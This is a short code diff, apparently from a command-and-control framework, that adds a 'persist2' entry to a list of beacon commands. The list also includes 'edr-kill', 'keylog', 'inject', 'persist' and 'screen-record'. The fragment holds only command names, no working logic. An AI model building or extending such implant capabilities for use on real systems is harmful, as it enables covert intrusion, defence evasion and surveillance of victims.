@@ -38,7 +38,7 @@ BEACON_VERBS = frozenset({
     "edr-kill", "edrcheck", "exec", "exit", "find", "gps", "health",
     "inject", "inject-eb", "inject-tl", "keylog", "kill", "ls",
     "mem-run", "migrate", "netinfo", "netstat", "netstat-json", "persist",
-    "portfwd", "portfwd-stop", "processes", "pwd", "recon", "remote",
+    "persist2", "portfwd", "portfwd-stop", "processes", "pwd", "recon", "remote",
     "run", "screen-dump", "screen-record", "screen-record-live",
     "screen-stream", "screen-stream-stop", "screenshot", "set-sleep",
     "shell", "sleep", "smb-pipe", "smb-pipe-stop", "socks", "socks-stop",
